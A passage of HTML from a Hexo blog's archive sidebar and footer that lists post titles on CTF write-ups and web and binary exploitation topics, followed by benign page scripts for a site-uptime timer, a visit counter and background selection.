href="/2021/04/09/%E4%BB%8E%E5%AF%B9b00k%E9%A2%98%E7%9B%AEwp%E5%AD%A6%E4%B9%A0%E5%88%9D%E4%B9%A0off-by-one%E2%80%94%E2%80%94%E5%AD%A6pwn%E5%B0%8F%E8%AE%B0(7)/">从对b00k题目学习中初习off-by-one——学pwn小记(7)</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/08/actf--wp/">ångstromCTF 2021--wp与复现记</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/03/25/%E4%BF%AE%E6%94%B9ELF%E6%96%87%E4%BB%B6libc%E4%B8%BA%E6%8C%87%E5%AE%9A%E7%89%88%E6%9C%AC/">修改ELF文件libc为指定版本</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/03/14/%E5%8A%AB%E6%8C%81hook%E5%87%BD%E6%95%B0%E2%80%94%E2%80%94%E5%AD%A6pwn%E5%B0%8F%E8%AE%B0(6)/">劫持hook函数——学pwn小记(6)</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/03/11/fastbin%E4%BA%8C%E6%AC%A1%E9%87%8A%E6%94%BE%E2%80%94%E2%80%94%E5%AD%A6pwn%E5%B0%8F%E8%AE%B0(5)/">fastbin二次释放——学pwn小记(5)</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/02/15/%E7%BD%91%E9%BC%8E%E6%9D%AF%202018-Comment%20%20%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/">网鼎杯 2018-Comment  复现笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/01/31/%E5%85%B3%E4%BA%8Esql%E6%B3%A8%E5%85%A5bypass%E6%80%BB%E7%BB%93/">关于sql注入bypass总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/01/08/%E5%AE%89%E6%B4%B5%E6%9D%AF2019%E5%A4%8D%E7%8E%B0/">安洵杯2019复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/01/07/xman%20pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/">xman pwn题复现——学pwn小记（4）</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/12/31/flask.request%E7%9A%84%E5%86%85%E7%BD%AE%E5%B1%9E%E6%80%A7%E6%80%BB%E7%BB%93/">flask.request的内置属性总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/12/30/%E5%AF%B9php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%BD%92%E7%BA%B3/">对php伪协议的归纳</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/12/21/HWCTF-%E5%8D%8E%E4%B8%BA%E4%BA%91%E5%9C%BAWP/">HWCTF-华为云场WP</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/12/16/linux%20%E5%86%85%E7%BD%AE%E5%8F%82%E6%95%B0%E6%95%B4%E7%90%86/">linux 内置参数整理</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/11/27/%E5%85%B3%E4%BA%8Ejinja%E7%89%B9%E6%80%A7%E5%AF%B9ssti%E7%9A%84bypass%E7%9A%84%E5%BD%B1%E5%93%8D/">关于jinja2特性对ssti的bypass的影响</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/11/16/%E5%85%B3%E4%BA%8Ephp%E6%89%A7%E8%A1%8C%E4%B8%8E%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%A4%84%E7%90%86%E5%87%BD%E6%95%B0%E6%95%B4%E7%90%86/">php执行与文件系统处理函数整理</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/11/15/%E7%AC%AC%E4%BA%94%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-wp/">第五届上海市大学生网络安全大赛-初赛wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/11/12/ctf-show_%E5%8E%9F%E8%B0%85%E6%9D%AFwp/">ctf-show_原谅杯wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/10/26/ctf-show%201024%E6%9D%AF/">ctf-show 1024杯</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/10/15/%E5%AD%A6%E4%B9%A0pwn%E5%B0%8F%E8%AE%B0(3)/">Linux_x64下的ret2bilc与ret2csu--学习pwn小记(3)</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/09/22/%E7%AC%AC%E5%8D%81%E4%B8%89%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B%E8%A5%BF%E5%8D%97%E8%B5%9B%E5%8C%BA%E9%80%89%E6%8B%94%E8%B5%9Bwp/">第十三届全国大学生信息安全竞赛-创新实践能力赛西南赛区选拔赛wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/09/13/%E5%AD%A6%E4%B9%A0pwn%E5%B0%8F%E8%AE%B0(2)/">学习pwn小记(2)</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/09/10/%E5%AF%B9linux%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E6%80%BB%E7%BB%93/">对linux 命令执行的总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/09/09/%E5%AD%A6%E4%B9%A0pwn%E5%B0%8F%E8%AE%B0(1)/">学习pwn小记(1)</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/08/12/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/">关于SQL注入小记</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/26/%E5%AE%89%E6%81%92DASCTF%207%E6%9C%88%E8%B5%9BWP/">安恒DASCTF 7月赛WP</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/15/rgbCTF--wp/">sctf2020 pythonbox题目复现小记</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/06/18/NahamCon%20CTF%20WP/">NahamCon CTF WP</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/05/31/%E5%AF%B9%E4%BA%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86/">对于文件包含漏洞的知识梳理</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/26/%E5%85%B3%E4%BA%8Ephp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8%E7%9A%84%E6%80%9D%E8%80%83/">关于php反序列化字符逃逸的思考</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/23/%E5%A6%82%E4%BD%95%E8%AE%A9%E6%96%87%E4%BB%B6%E9%87%8CPHP%E4%BB%A3%E7%A0%81%E8%A2%AB%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A7%A3%E6%9E%90%E6%89%A7%E8%A1%8C/">如何让文件里PHP代码被服务器解析执行</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/21/%E8%99%8E%E7%AC%A6CTF2020--EasyLogin%20%20%20Write%20%20up/">虎符CTF2020--EasyLogin WP</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/27/python%20%E5%85%B3%E4%BA%8E%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E7%9A%84%E6%80%9D%E8%80%83/">关于python ssti的思考</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/11/13/%E5%85%B3%E4%BA%8Eupdatexml()%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E7%9A%84%E6%80%9D%E8%80%83/">关于updatexml()报错注入的思考</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/10/cocos2d%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3%E6%B1%89%E5%8C%96--Writing%20a%20cocos2d%20application/">cocos2d官方文档汉化--Writing a cocos2d application</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/03/hello-world/">Hello World</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+        	                <span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date(); 
+    function createtime() { 
+        var grt= new Date("01/03/2019 12:39:00");//此处修改你的建站时间或者网站上线时间 
+        now.setTime(now.getTime()+250); 
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days); 
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours); 
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum); 
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;} 
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum); 
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;} 
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 "; 
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒"; 
+    } 
+setInterval("createtime()",250);
+</script>
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2019-2021 lexsd6
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    
+                
+                
+                    <span>| </span>
+                
+                
+                    
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                  
+                
+	
+            
+
+
+
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 20;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+    <script>
+        var originTitle = document.title;
+        var titleTime;
+        document.addEventListener("visibilitychange", function() {
+            if (document.hidden) {
+                document.title = "(つェ⊂) 我藏好了哦~ " + originTitle;
+                clearTimeout(titleTime);
+            }
+            else {
+                document.title = "(*´∇｀*) 被你发现啦~ " + originTitle;
+                titleTime = setTimeout(function() {
+                    document.title = originTitle;
+                }, 2000);
+            }
+        })
+    </script>
+
+
+  </div>
+</body>
+</html>
